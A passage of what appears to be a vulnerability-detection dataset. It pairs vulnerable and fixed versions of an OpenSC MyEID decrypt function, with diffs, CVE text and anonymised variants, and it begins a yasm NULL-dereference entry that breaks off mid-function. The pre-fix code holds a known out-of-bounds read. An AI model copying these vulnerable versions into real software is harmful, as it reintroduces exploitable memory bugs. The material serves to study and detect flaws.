priv->sym_plain_buffer_len = 0;
}
priv->sym_crypt_buffer_len = datalen;
sc_log(ctx, ""rest data len = %zu"", datalen);
if (data)
memcpy(priv->sym_crypt_buffer, data, datalen);
sc_log(ctx, ""return data len = %zu"", return_len);
*outlen = return_len;
return SC_SUCCESS;
}","static int
myeid_enc_dec_sym(struct sc_card *VAR_0, const u8 *VAR_1, size_t VAR_2,
u8 *VAR_3, size_t *VAR_4, int VAR_5)
{
struct sc_context *VAR_6;
struct sc_apdu VAR_7;
u8 VAR_8[VAR_9];
u8 VAR_10[VAR_9];
u8 *VAR_11;
int VAR_12, VAR_13 = 0, VAR_14 = 0;
size_t VAR_15;
size_t VAR_16, VAR_17;
size_t VAR_18 = 0;
size_t VAR_19;
size_t VAR_20;
assert(VAR_0 != NULL);
VAR_6 = VAR_0->ctx;
LOG_FUNC_CALLED(VAR_6);
myeid_private_data_t *VAR_21;
VAR_21 = (myeid_private_data_t *)VAR_0->drv_data;
VAR_19 = sc_get_max_send_size(VAR_0);
if (VAR_19 > sc_get_max_recv_size(VAR_0))
VAR_19 = sc_get_max_recv_size(VAR_0);
if (VAR_19 > VAR_9)
VAR_19 = VAR_9;
sc_log(VAR_6, ""algorithm %d algorithm_flags %x"", VAR_21->algorithm, VAR_21->algorithm_flags);
if (VAR_4 == NULL) {
sc_log(VAR_6, ""%s (symmetric key) initialized"", VAR_5 ? ""C_DecryptInit"" : ""C_EncryptInit"");
VAR_21->sym_crypt_buffer_len = 0;
VAR_21->sym_plain_buffer_len = 0;
return VAR_22;
}
switch (VAR_21->algorithm) {
case VAR_23:
VAR_15 = 16;
if (VAR_21->algorithm_flags & VAR_24) {
VAR_13 = 0;
VAR_14 = 0;
} else if (VAR_21->algorithm_flags & VAR_25) {
VAR_13 = 0;
VAR_14 = 1;
} else if (VAR_21->algorithm_flags & VAR_26) {
VAR_13 = 1;
VAR_14 = 1;
}
break;
default:
LOG_FUNC_RETURN(VAR_6, VAR_27);
}
if (VAR_14)
VAR_19 -= VAR_19 % VAR_15;
else
VAR_19 = VAR_15;
VAR_17 = VAR_21->sym_crypt_buffer_len;
if (VAR_1 == NULL) {
if (VAR_2 != 0)
LOG_FUNC_RETURN(VAR_6, VAR_28);
if (VAR_5) {
if (VAR_21->sym_plain_buffer_len != VAR_15)
LOG_FUNC_RETURN(VAR_6, VAR_28);
if (VAR_17)
LOG_FUNC_RETURN(VAR_6, VAR_28);
VAR_18 = VAR_15;
if (VAR_13) {
uint8_t VAR_29, VAR_30 = *(VAR_21->sym_plain_buffer + VAR_15 - 1);
sc_log(VAR_6, ""Found padding byte %02x"", VAR_30);
if (VAR_30 == 0 || VAR_30 > VAR_15)
LOG_FUNC_RETURN(VAR_6, VAR_31);
VAR_11 = VAR_21->sym_plain_buffer + VAR_15 - VAR_30;
for (VAR_29 = 0; VAR_29 < VAR_30; VAR_29++)
if (VAR_11[VAR_29] != VAR_30)
LOG_FUNC_RETURN(VAR_6, VAR_31);
VAR_18 = VAR_15 - VAR_30;
}
*VAR_4 = VAR_18;
if (VAR_3 == NULL)
LOG_FUNC_RETURN(VAR_6, VAR_22);
if (VAR_18 > *VAR_4)
LOG_FUNC_RETURN(VAR_6, VAR_32);
memcpy(VAR_3, VAR_21->sym_plain_buffer, VAR_18);
sc_log(VAR_6, ""C_DecryptFinal %zu bytes"", *VAR_4);
return VAR_22;
} else {
if (VAR_13) {
uint8_t VAR_30 = VAR_15 - VAR_17;
sc_log(VAR_6, ""Generating padding, padding byte: %d"", VAR_30);
VAR_11 = VAR_21->sym_crypt_buffer + VAR_17;
memset(VAR_11, VAR_30, VAR_30);
VAR_17 = VAR_15;
} else if (VAR_17) {
LOG_FUNC_RETURN(VAR_6, VAR_28);
}
}
}
VAR_16 = VAR_2 + VAR_17;
sc_log(VAR_6, ""datalen=%zu rest_len=%zu len=%zu outlen=%zu"", VAR_2, VAR_17, VAR_16, *VAR_4);
VAR_16 -= (VAR_16 % VAR_15);
*VAR_4 = VAR_16;
if (VAR_3 == NULL)
LOG_FUNC_RETURN(VAR_6, VAR_22);
if (*VAR_4 < VAR_16)
LOG_FUNC_RETURN(VAR_6, VAR_32);
while (VAR_16 >= VAR_15) {
if (!VAR_5)
sc_format_apdu(VAR_0, &VAR_7, VAR_33, 0x2A, 0x84, 0x80);
else
sc_format_apdu(VAR_0, &VAR_7, VAR_33, 0x2A, 0x80, 0x84);
VAR_7.cla = 0;
if (VAR_16 > VAR_19)
VAR_20 = VAR_19;
else
VAR_20 = VAR_16;
if (VAR_14)
VAR_7.cla = 0x10;
VAR_16 -= VAR_20;
VAR_11 = VAR_10;
VAR_7.le = VAR_20;
VAR_7.lc = VAR_20;
VAR_7.datalen = VAR_20;
VAR_7.data = VAR_10;
VAR_7.resplen = sizeof(VAR_8);
VAR_7.resp = VAR_8;
if (VAR_17) {
memcpy(VAR_10, VAR_21->sym_crypt_buffer, VAR_17);
VAR_11 += VAR_17;
VAR_20 -= VAR_17;
VAR_21->sym_crypt_buffer_len = 0;
VAR_17 = 0;
}
if (VAR_1) {
memcpy(VAR_11, VAR_1, VAR_20);
VAR_1 += VAR_20;
VAR_2 -= VAR_20;
}
VAR_12 = sc_transmit_apdu(VAR_0, &VAR_7);
LOG_TEST_RET(VAR_6, VAR_12, ""APDU transmit failed"");
VAR_12 = sc_check_sw(VAR_0, VAR_7.sw1, VAR_7.sw2);
LOG_TEST_RET(VAR_6, VAR_12, ""decrypt_sym/encrypt_sym failed"");
if (VAR_7.resplen != VAR_7.datalen)
LOG_FUNC_RETURN(VAR_6, VAR_28);
memcpy(VAR_3, VAR_7.resp, VAR_7.resplen);
VAR_3 += VAR_7.resplen;
VAR_18 += VAR_7.resplen;
}
if (VAR_5) {
uint8_t VAR_34[16];
if (VAR_18 >= VAR_15) {
memcpy(VAR_34, VAR_3 - VAR_15, VAR_15);
if (VAR_21->sym_plain_buffer_len) {
sc_log(VAR_6, ""inserting block from previous decrypt"");
memmove(VAR_3 - VAR_18 + VAR_15, VAR_3 - VAR_18, VAR_18 - VAR_15);
memcpy(VAR_3 - VAR_18, VAR_21->sym_plain_buffer, VAR_15);
} else
VAR_18 -= VAR_15;
memcpy(VAR_21->sym_plain_buffer, VAR_34, VAR_15);
VAR_21->sym_plain_buffer_len = VAR_15;
} else
VAR_21->sym_plain_buffer_len = 0;
}
VAR_21->sym_crypt_buffer_len = VAR_2;
sc_log(VAR_6, ""rest data len = %zu"", VAR_2);
if (VAR_1)
memcpy(VAR_21->sym_crypt_buffer, VAR_1, VAR_2);
sc_log(VAR_6, ""return data len = %zu"", VAR_18);
*VAR_4 = VAR_18;
return VAR_22;
}",OpenSC/f1993dc4e0b33050b8f72a3558ee88b24c4063b2/card-myeid.c/vul/before/0.json,"static int
myeid_enc_dec_sym(struct sc_card *card, const u8 *data, size_t datalen,
		u8 *out, size_t *outlen, int decipher)
{

	struct sc_context *ctx;

	struct sc_apdu apdu;
	u8 rbuf[SC_MAX_APDU_BUFFER_SIZE];
	u8 sbuf[SC_MAX_APDU_BUFFER_SIZE];
	u8 *sdata;
	int r, padding = 0, cbc = 0;

	size_t block_size;
	size_t len, rest_len;
	size_t return_len = 0;

	size_t max_apdu_datalen;
	size_t apdu_datalen;

	assert(card != NULL);

	ctx = card->ctx;
	LOG_FUNC_CALLED(ctx);

	myeid_private_data_t *priv;
	priv = (myeid_private_data_t *)card->drv_data;

	/* How many cipher blocks will fit in the APDU. We do not use the APDU chaining
	 * mechanism from OpenSC, because we need the size of the APDU data block
	 * to match a multiple of the cipher block size */

	max_apdu_datalen = sc_get_max_send_size(card);
	if (max_apdu_datalen > sc_get_max_recv_size(card))
		max_apdu_datalen = sc_get_max_recv_size(card);

	if (max_apdu_datalen > SC_MAX_APDU_BUFFER_SIZE)
		max_apdu_datalen = SC_MAX_APDU_BUFFER_SIZE;

	sc_log(ctx, ""algorithm %d algorithm_flags %x"", priv->algorithm, priv->algorithm_flags);

	/* for C_Encrypt/C_EncryptUpdate/C_EncryptFinalize/C_Decrypt/C_DecryptUpdate/C_DecryptFinalize
	 * the 'outlen' is always not NULL (src/pkcs11/framework-pkcs15.c).
	 * For C_EncryptInit and C_DecrytpInit the 'outlen' is set to NULL
	 */
	if (outlen == NULL) {
		/* C_EncryptInit/C_DecryptInit - clear buffers */
		sc_log(ctx, ""%s (symmetric key) initialized"", decipher ? ""C_DecryptInit"" : ""C_EncryptInit"");
		priv->sym_crypt_buffer_len = 0;
		priv->sym_plain_buffer_len = 0;
		return SC_SUCCESS;
	}

	switch (priv->algorithm) {
	case SC_ALGORITHM_AES:
		block_size = 16;
		if (priv->algorithm_flags & SC_ALGORITHM_AES_ECB) {
			padding = 0;
			cbc = 0;
		} else if (priv->algorithm_flags & SC_ALGORITHM_AES_CBC) {
			padding = 0;
			cbc = 1;
		} else if (priv->algorithm_flags & SC_ALGORITHM_AES_CBC_PAD) {
			padding = 1;
			cbc = 1;
		}
		break;
	default:
		LOG_FUNC_RETURN(ctx, SC_ERROR_NOT_SUPPORTED);
	}

	/* MyEID: ECB APDU must match exact cipher block size in CBC
	 * mode up to 240 bytes can be handled in one APDU
	 * round max_apdu_datalen to multiple of block_size (CBC mode) */

	if (cbc)
		max_apdu_datalen -= max_apdu_datalen % block_size;
	else
		max_apdu_datalen = block_size;

	/* Maybe we have more input data (from previous PSO operation). */
	rest_len = priv->sym_crypt_buffer_len;

	/* no input data from application (this is C_EncryptFinalize/C_DecryptFinalize */
	if (data == NULL) {
		if (datalen != 0)
			LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
		if (decipher) {
			/* C_DecryptFinalize */
			/* decrypted buffer size must match the block size */
			if (priv->sym_plain_buffer_len != block_size)
				LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
			/* do we have any encrypted data left? */
			if (rest_len)
				LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);

			return_len = block_size;
			if (padding) {
				/* check padding */
				uint8_t i, pad_byte = *(priv->sym_plain_buffer + block_size - 1);

				sc_log(ctx, ""Found padding byte %02x"", pad_byte);
				if (pad_byte == 0 || pad_byte > block_size)
					LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_PADDING);
				sdata = priv->sym_plain_buffer + block_size;
				for (i = 0; i < pad_byte; i++)
					if (*(--sdata) != pad_byte)
						LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_PADDING);
				return_len = block_size - pad_byte;
			}
			/* application can request buffer size or actual buffer size is too small */
			if (out == NULL) {
				*outlen = return_len;
				LOG_FUNC_RETURN(ctx, SC_SUCCESS);
			}
			if (return_len > *outlen)
				LOG_FUNC_RETURN(ctx, SC_ERROR_BUFFER_TOO_SMALL);
			*outlen = return_len;
			memcpy(out, priv->sym_plain_buffer, return_len);
			sc_log(ctx, ""C_DecryptFinal %zu bytes"", *outlen);
			return SC_SUCCESS;
		} else {
			/* C_EncryptFinalize */
			if (padding) {
				uint8_t pad_byte = block_size - rest_len;
				sc_log(ctx, ""Generating padding, padding byte: %d"", pad_byte);
				sdata = priv->sym_crypt_buffer + rest_len;
				memset(sdata, pad_byte, pad_byte);
				rest_len = block_size;

			} else if (rest_len) {
				LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
			}
			/* fall through - encipher last block */
		}
	}
	/* check output buffer size */
	len = datalen + rest_len;

	sc_log(ctx, ""datalen=%zu rest_len=%zu len=%zu outlen=%zu"", datalen, rest_len, len, *outlen);
	/* there is block_size bytes space that can be saved to next run */
	len -= (len % block_size);

	/* application can request buffer size or actual buffer size is too small */
	*outlen = len;
	if (out == NULL)
		LOG_FUNC_RETURN(ctx, SC_SUCCESS);
	/* application buffer is too small */
	if (*outlen < len)
		LOG_FUNC_RETURN(ctx, SC_ERROR_BUFFER_TOO_SMALL);

	/* main loop */
	while (len >= block_size) {
		if (!decipher)
			sc_format_apdu(card, &apdu, SC_APDU_CASE_4_SHORT, 0x2A, 0x84, 0x80);
		else
			sc_format_apdu(card, &apdu, SC_APDU_CASE_4_SHORT, 0x2A, 0x80, 0x84);
		apdu.cla = 0;

		if (len > max_apdu_datalen)
			apdu_datalen = max_apdu_datalen;
		else
			apdu_datalen = len;

		if (cbc)
			apdu.cla = 0x10;

		len -= apdu_datalen;
		sdata = sbuf;

		apdu.le = apdu_datalen;
		apdu.lc = apdu_datalen;
		apdu.datalen = apdu_datalen;
		apdu.data = sbuf;
		apdu.resplen = sizeof(rbuf);
		apdu.resp = rbuf;

		/* do we have any data from the previous step ? */
		if (rest_len) {
			memcpy(sbuf, priv->sym_crypt_buffer, rest_len);
			sdata += rest_len;
			apdu_datalen -= rest_len;
			priv->sym_crypt_buffer_len = 0;
			rest_len = 0;
		}
		if (data) {
			memcpy(sdata, data, apdu_datalen);
			data += apdu_datalen;
			datalen -= apdu_datalen;
		}
		r = sc_transmit_apdu(card, &apdu);
		LOG_TEST_RET(ctx, r, ""APDU transmit failed"");
		r = sc_check_sw(card, apdu.sw1, apdu.sw2);
		LOG_TEST_RET(ctx, r, ""decrypt_sym/encrypt_sym failed"");
		if (apdu.resplen != apdu.datalen)
			LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_LENGTH);
		memcpy(out, apdu.resp, apdu.resplen);
		out += apdu.resplen;
		return_len += apdu.resplen;
	}
	/* last block is stored in buffer and is returned to application
	 * in next call to C_DecryptUpdate or C_DecryptFinal. This allow us
	 * to compute how many bytes is to be returned after padding removal.
	 * Whole handling of this is here, because ""data"" and ""out"" buffer
	 * can be in the same place.
	 */
	if (decipher) {
		uint8_t tmp_buf[16];
		if (return_len >= block_size) {
			/* save last block to temp buffer */
			memcpy(tmp_buf, out - block_size, block_size);
			if (priv->sym_plain_buffer_len) {
				/* insert previous last block to output buffer */
				sc_log(ctx, ""inserting block from previous decrypt"");
				memmove(out - return_len + block_size, out - return_len, return_len - block_size);
				memcpy(out - return_len, priv->sym_plain_buffer, block_size);
			} else
				return_len -= block_size;
			/* save last (decrypted) block */
			memcpy(priv->sym_plain_buffer, tmp_buf, block_size);
			priv->sym_plain_buffer_len = block_size;

		} else
			priv->sym_plain_buffer_len = 0;
	}
	/* save rest of data for next run */
	priv->sym_crypt_buffer_len = datalen;
	sc_log(ctx, ""rest data len = %zu"", datalen);
	if (data)
		memcpy(priv->sym_crypt_buffer, data, datalen);
	sc_log(ctx, ""return data len = %zu"", return_len);
	*outlen = return_len;
	return SC_SUCCESS;
}","static int
myeid_enc_dec_sym(struct sc_card *VAR_0, const u8 *VAR_1, size_t VAR_2,
		u8 *VAR_3, size_t *VAR_4, int VAR_5)
{

	struct sc_context *VAR_6;

	struct sc_apdu VAR_7;
	u8 VAR_8[VAR_9];
	u8 VAR_10[VAR_9];
	u8 *VAR_11;
	int VAR_12, VAR_13 = 0, VAR_14 = 0;

	size_t VAR_15;
	size_t VAR_16, VAR_17;
	size_t VAR_18 = 0;

	size_t VAR_19;
	size_t VAR_20;

	assert(VAR_0 != NULL);

	VAR_6 = VAR_0->ctx;
	LOG_FUNC_CALLED(VAR_6);

	myeid_private_data_t *VAR_21;
	VAR_21 = (myeid_private_data_t *)VAR_0->drv_data;

	/* COMMENT_0 */
                                                                          
                                                   

	VAR_19 = sc_get_max_send_size(VAR_0);
	if (VAR_19 > sc_get_max_recv_size(VAR_0))
		VAR_19 = sc_get_max_recv_size(VAR_0);

	if (VAR_19 > VAR_9)
		VAR_19 = VAR_9;

	sc_log(VAR_6, ""algorithm %d algorithm_flags %x"", VAR_21->algorithm, VAR_21->algorithm_flags);

	/* COMMENT_3 */
                                                                    
                                                                   
    
	if (VAR_4 == NULL) {
		/* COMMENT_7 */
		sc_log(VAR_6, ""%s (symmetric key) initialized"", VAR_5 ? ""C_DecryptInit"" : ""C_EncryptInit"");
		VAR_21->sym_crypt_buffer_len = 0;
		VAR_21->sym_plain_buffer_len = 0;
		return VAR_22;
	}

	switch (VAR_21->algorithm) {
	case VAR_23:
		VAR_15 = 16;
		if (VAR_21->algorithm_flags & VAR_24) {
			VAR_13 = 0;
			VAR_14 = 0;
		} else if (VAR_21->algorithm_flags & VAR_25) {
			VAR_13 = 0;
			VAR_14 = 1;
		} else if (VAR_21->algorithm_flags & VAR_26) {
			VAR_13 = 1;
			VAR_14 = 1;
		}
		break;
	default:
		LOG_FUNC_RETURN(VAR_6, VAR_27);
	}

	/* COMMENT_8 */
                                                   
                                                                  

	if (VAR_14)
		VAR_19 -= VAR_19 % VAR_15;
	else
		VAR_19 = VAR_15;

	/* COMMENT_11 */
	VAR_17 = VAR_21->sym_crypt_buffer_len;

	/* COMMENT_12 */
	if (VAR_1 == NULL) {
		if (VAR_2 != 0)
			LOG_FUNC_RETURN(VAR_6, VAR_28);
		if (VAR_5) {
			/* COMMENT_13 */
			/* COMMENT_14 */
			if (VAR_21->sym_plain_buffer_len != VAR_15)
				LOG_FUNC_RETURN(VAR_6, VAR_28);
			/* COMMENT_15 */
			if (VAR_17)
				LOG_FUNC_RETURN(VAR_6, VAR_28);

			VAR_18 = VAR_15;
			if (VAR_13) {
				/* COMMENT_16 */
				uint8_t VAR_29, VAR_30 = *(VAR_21->sym_plain_buffer + VAR_15 - 1);

				sc_log(VAR_6, ""Found padding byte %02x"", VAR_30);
				if (VAR_30 == 0 || VAR_30 > VAR_15)
					LOG_FUNC_RETURN(VAR_6, VAR_31);
				VAR_11 = VAR_21->sym_plain_buffer + VAR_15;
				for (VAR_29 = 0; VAR_29 < VAR_30; VAR_29++)
					if (*(--VAR_11) != VAR_30)
						LOG_FUNC_RETURN(VAR_6, VAR_31);
				VAR_18 = VAR_15 - VAR_30;
			}
			/* COMMENT_17 */
			if (VAR_3 == NULL) {
				*VAR_4 = VAR_18;
				LOG_FUNC_RETURN(VAR_6, VAR_22);
			}
			if (VAR_18 > *VAR_4)
				LOG_FUNC_RETURN(VAR_6, VAR_32);
			*VAR_4 = VAR_18;
			memcpy(VAR_3, VAR_21->sym_plain_buffer, VAR_18);
			sc_log(VAR_6, ""C_DecryptFinal %zu bytes"", *VAR_4);
			return VAR_22;
		} else {
			/* COMMENT_18 */
			if (VAR_13) {
				uint8_t VAR_30 = VAR_15 - VAR_17;
				sc_log(VAR_6, ""Generating padding, padding byte: %d"", VAR_30);
				VAR_11 = VAR_21->sym_crypt_buffer + VAR_17;
				memset(VAR_11, VAR_30, VAR_30);
				VAR_17 = VAR_15;

			} else if (VAR_17) {
				LOG_FUNC_RETURN(VAR_6, VAR_28);
			}
			/* COMMENT_19 */
		}
	}
	/* COMMENT_20 */
	VAR_16 = VAR_2 + VAR_17;

	sc_log(VAR_6, ""datalen=%zu rest_len=%zu len=%zu outlen=%zu"", VAR_2, VAR_17, VAR_16, *VAR_4);
	/* COMMENT_21 */
	VAR_16 -= (VAR_16 % VAR_15);

	/* COMMENT_17 */
	*VAR_4 = VAR_16;
	if (VAR_3 == NULL)
		LOG_FUNC_RETURN(VAR_6, VAR_22);
	/* COMMENT_22 */
	if (*VAR_4 < VAR_16)
		LOG_FUNC_RETURN(VAR_6, VAR_32);

	/* COMMENT_23 */
	while (VAR_16 >= VAR_15) {
		if (!VAR_5)
			sc_format_apdu(VAR_0, &VAR_7, VAR_33, 0x2A, 0x84, 0x80);
		else
			sc_format_apdu(VAR_0, &VAR_7, VAR_33, 0x2A, 0x80, 0x84);
		VAR_7.cla = 0;

		if (VAR_16 > VAR_19)
			VAR_20 = VAR_19;
		else
			VAR_20 = VAR_16;

		if (VAR_14)
			VAR_7.cla = 0x10;

		VAR_16 -= VAR_20;
		VAR_11 = VAR_10;

		VAR_7.le = VAR_20;
		VAR_7.lc = VAR_20;
		VAR_7.datalen = VAR_20;
		VAR_7.data = VAR_10;
		VAR_7.resplen = sizeof(VAR_8);
		VAR_7.resp = VAR_8;

		/* COMMENT_24 */
		if (VAR_17) {
			memcpy(VAR_10, VAR_21->sym_crypt_buffer, VAR_17);
			VAR_11 += VAR_17;
			VAR_20 -= VAR_17;
			VAR_21->sym_crypt_buffer_len = 0;
			VAR_17 = 0;
		}
		if (VAR_1) {
			memcpy(VAR_11, VAR_1, VAR_20);
			VAR_1 += VAR_20;
			VAR_2 -= VAR_20;
		}
		VAR_12 = sc_transmit_apdu(VAR_0, &VAR_7);
		LOG_TEST_RET(VAR_6, VAR_12, ""APDU transmit failed"");
		VAR_12 = sc_check_sw(VAR_0, VAR_7.sw1, VAR_7.sw2);
		LOG_TEST_RET(VAR_6, VAR_12, ""decrypt_sym/encrypt_sym failed"");
		if (VAR_7.resplen != VAR_7.datalen)
			LOG_FUNC_RETURN(VAR_6, VAR_28);
		memcpy(VAR_3, VAR_7.resp, VAR_7.resplen);
		VAR_3 += VAR_7.resplen;
		VAR_18 += VAR_7.resplen;
	}
	/* COMMENT_25 */
                                                                    
                                                                      
                                                                   
                             
    
	if (VAR_5) {
		uint8_t VAR_34[16];
		if (VAR_18 >= VAR_15) {
			/* COMMENT_31 */
			memcpy(VAR_34, VAR_3 - VAR_15, VAR_15);
			if (VAR_21->sym_plain_buffer_len) {
				/* COMMENT_32 */
				sc_log(VAR_6, ""inserting block from previous decrypt"");
				memmove(VAR_3 - VAR_18 + VAR_15, VAR_3 - VAR_18, VAR_18 - VAR_15);
				memcpy(VAR_3 - VAR_18, VAR_21->sym_plain_buffer, VAR_15);
			} else
				VAR_18 -= VAR_15;
			/* COMMENT_33 */
			memcpy(VAR_21->sym_plain_buffer, VAR_34, VAR_15);
			VAR_21->sym_plain_buffer_len = VAR_15;

		} else
			VAR_21->sym_plain_buffer_len = 0;
	}
	/* COMMENT_34 */
	VAR_21->sym_crypt_buffer_len = VAR_2;
	sc_log(VAR_6, ""rest data len = %zu"", VAR_2);
	if (VAR_1)
		memcpy(VAR_21->sym_crypt_buffer, VAR_1, VAR_2);
	sc_log(VAR_6, ""return data len = %zu"", VAR_18);
	*VAR_4 = VAR_18;
	return VAR_22;
}",OpenSC/f1993dc4e0b33050b8f72a3558ee88b24c4063b2/card-myeid.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -102,18 +102,20 @@
 				sc_log(ctx, ""Found padding byte %02x"", pad_byte);
 				if (pad_byte == 0 || pad_byte > block_size)
 					LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_PADDING);
-				sdata = priv->sym_plain_buffer + block_size - pad_byte;
+				sdata = priv->sym_plain_buffer + block_size;
 				for (i = 0; i < pad_byte; i++)
-					if (sdata[i] != pad_byte)
+					if (*(--sdata) != pad_byte)
 						LOG_FUNC_RETURN(ctx, SC_ERROR_WRONG_PADDING);
 				return_len = block_size - pad_byte;
 			}
-			*outlen = return_len;
 			/* application can request buffer size or actual buffer size is too small */
-			if (out == NULL)
+			if (out == NULL) {
+				*outlen = return_len;
 				LOG_FUNC_RETURN(ctx, SC_SUCCESS);
+			}
 			if (return_len > *outlen)
 				LOG_FUNC_RETURN(ctx, SC_ERROR_BUFFER_TOO_SMALL);
+			*outlen = return_len;
 			memcpy(out, priv->sym_plain_buffer, return_len);
 			sc_log(ctx, ""C_DecryptFinal %zu bytes"", *outlen);
 			return SC_SUCCESS;","{'deleted_lines': ['\t\t\t\tsdata = priv->sym_plain_buffer + block_size - pad_byte;', '\t\t\t\t\tif (sdata[i] != pad_byte)', '\t\t\t*outlen = return_len;', '\t\t\tif (out == NULL)'], 'added_lines': ['\t\t\t\tsdata = priv->sym_plain_buffer + block_size;', '\t\t\t\t\tif (*(--sdata) != pad_byte)', '\t\t\tif (out == NULL) {', '\t\t\t\t*outlen = return_len;', '\t\t\t}', '\t\t\t*outlen = return_len;']}",True,"An out-of-bounds read vulnerability was found in OpenSC packages within the MyEID driver when handling symmetric key encryption. Exploiting this flaw requires an attacker to have physical access to the computer and a specially crafted USB device or smart card. This flaw allows the attacker to manipulate APDU responses and potentially gain unauthorized access to sensitive data, compromising the system's security.",4.5,MEDIUM,1,valid,2023-06-27T07:50:42Z,4
CVE-2023-37732,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,yasm,elf.c: Fix NULL deref on bad xsize expression,8a9af472a7160edf3d8ee0a994433d3c6e14cefc,https://github.com/yasm/yasm/commit/8a9af472a7160edf3d8ee0a994433d3c6e14cefc,modules/objfmts/elf/elf.c,elf_symtab_write_to_file,"unsigned long
elf_symtab_write_to_file(FILE *f, elf_symtab_head *symtab,
yasm_errwarns *errwarns)
{
unsigned char buf[SYMTAB_MAXSIZE], *bufp;
elf_symtab_entry *entry;
unsigned long size = 0;
if (!symtab)
yasm_internal_error(N_(""symtab is null""));
STAILQ_FOREACH(entry, symtab, qlink) {
yasm_intnum *size_intn=NULL, *value_intn=NULL;
bufp = buf;
if (entry->xsize) {
size_intn = yasm_intnum_copy(
yasm_expr_get_intnum(&entry->xsize, 1));
if (!size_intn) {
yasm_error_set(YASM_ERROR_VALUE,
N_(""size specifier not an integer expression""));
yasm_errwarn_propagate(errwarns, entry->xsize->line);
}
}
else
size_intn = yasm_intnum_create_uint(entry->size);
if (entry->sym) {
const yasm_expr *equ_expr_c;
equ_expr_c = yasm_symrec_get_equ(entry->sym);
if (equ_expr_c != NULL) {
const yasm_intnum *equ_intn;
yasm_expr *equ_expr = yasm_expr_copy(equ_expr_c);
equ_intn = yasm_expr_get_intnum(&equ_expr, 1);
if (equ_intn == NULL) {
yasm_error_set(YASM_ERROR_VALUE,
N_(""EQU value not an integer expression""));
yasm_errwarn_propagate(errwarns, equ_expr->line);
} else
value_intn = yasm_intnum_copy(equ_intn);
entry->index = SHN_ABS;
yasm_expr_destroy(equ_expr);
}
}
if (value_intn == NULL)
value_intn = yasm_intnum_create_uint(entry->value);
if (entry->sym) {
yasm_bytecode *precbc;
yasm_section *sect;
elf_secthead *shead;
if (yasm_symrec_get_label(entry->sym, &precbc) &&
(sect = yasm_bc_get_section(precbc)) &&
(shead = yasm_section_get_data(sect, &elf_section_data)) &&
shead->flags & SHF_TLS) {
entry->type = STT_TLS;
}
}
if (!elf_march->write_symtab_entry || !elf_march->symtab_entry_size)
yasm_internal_error(N_(""Unsupported machine for ELF output""));
elf_march->write_symtab_entry(bufp, entry, value_intn, size_intn);
fwrite(buf, elf_march->symtab_entry_size, 1, f);
size += elf_march->symtab_entry_size;
yasm_intnum_destroy(size_intn);
yasm_intnum_destroy(value_intn);
}
return size;
}","unsigned long
elf_symtab_write_to_file(FILE *VAR_0, elf_symtab_head *VAR_1,
yasm_errwarns *VAR_2)
{
unsigned char VAR_3[VAR_4], *VAR_5;
elf_symtab_entry *VAR_6;
unsigned long VAR_7 = 0;
if (!VAR_1)
yasm_internal_error(N_(""symtab is null""));
STAILQ_FOREACH(VAR_6, VAR_1, VAR_8) {
yasm_intnum *VAR_9=NULL, *VAR_10=NULL;
VAR_5 = VAR_3;
if (VAR_6->xsize) {
VAR_9 = yasm_intnum_copy(
yasm_expr_get_intnum(&VAR_6->xsize, 1));
if (!VAR_9) {
yasm_error_set(VAR_11,
N_(""size specifier not an integer expression""));
yasm_errwarn_propagate(VAR_2, VAR_6->xsize->line);
}
}
else
VAR_9 = yasm_intnum_create_uint(VAR_6->size);
if (VAR_6->sym) {
const yasm_expr *VAR_12;
VAR_12 = yasm_symrec_get_equ(VAR_6->sym);
if (VAR_12 != NULL) {
const yasm_intnum *VAR_13;
yasm_expr *VAR_14 = yasm_expr_copy(VAR_12);
VAR_13 = yasm_expr_get_intnum(&VAR_14, 1);
if (VAR_13 == NULL) {
yasm_error_set(VAR_11,
N_(""EQU value not an integer expression""));
yasm_errwarn_propagate(VAR_2, VAR_14->line);
} else
VAR_10 = yasm_intnum_copy(VAR_13);
VAR_6->index = VAR_15;
yasm_expr_destroy(VAR_14);
}
}
if (VAR_10 == NULL)
VAR_10 = yasm_intnum_create_uint(VAR_6->value);
if (VAR_6->sym) {
yasm_bytecode *VAR_16;
yasm_section *VAR_17;
elf_secthead *VAR_18;
if (yasm_symrec_get_label(VAR_6->sym, &VAR_16) &&
(VAR_17 = yasm_bc_get_section(VAR_16)) &&
(VAR_18 = yasm_section_get_data(VAR_17, &VAR_19)) &&
VAR_18->flags & VAR_20) {
VAR_6->type = VAR_21;
}
}
if (!VAR_22->write_symtab_entry || !VAR_22->symtab_entry_size)
yasm_internal_error(N_(""Unsupported machine for ELF output""));
VAR_22->write_symtab_entry(VAR_5, VAR_6, VAR_10, VAR_9);
fwrite(VAR_3, VAR_22->symtab_entry_size, 1, VAR_0);
VAR_7 += VAR_22->symtab_entry_size;
yasm_intnum_destroy(VAR_9);
yasm_intnum_destroy(VAR_10);
}
return VAR_7;
}",yasm/8a9af472a7160edf3d8ee0a994433d3c6e14cefc/elf.c/vul/before/0.json,"unsigned long
elf_symtab_write_to_file(FILE *f, elf_symtab_head *symtab,
                         yasm_errwarns *errwarns)
{
    unsigned char buf[SYMTAB_MAXSIZE], *bufp;
    elf_symtab_entry *entry;
    unsigned long size = 0;

    if (!symtab)
        yasm_internal_error(N_(""symtab is null""));

    STAILQ_FOREACH(entry, symtab, qlink) {

        yasm_intnum *size_intn=NULL, *value_intn=NULL;
        bufp = buf;

        /* get size (if specified); expr overrides stored integer */
        if (entry->xsize) {
            yasm_intnum *intn = yasm_expr_get_intnum(&entry->xsize, 1);
            if (!intn) {
                yasm_error_set(YASM_ERROR_VALUE,
                               N_(""size specifier not an integer expression""));
                yasm_errwarn_propagate(errwarns, entry->xsize->line);
            } else
                size_intn = yasm_intnum_copy(intn);
        }
        if (!size_intn)
            size_intn = yasm_intnum_create_uint(entry->size);

        /* get EQU value for constants */
        if (entry->sym) {
            const yasm_expr *equ_expr_c;
            equ_expr_c = yasm_symrec_get_equ(entry->sym);

            if (equ_expr_c != NULL) {
                const yasm_intnum *equ_intn;
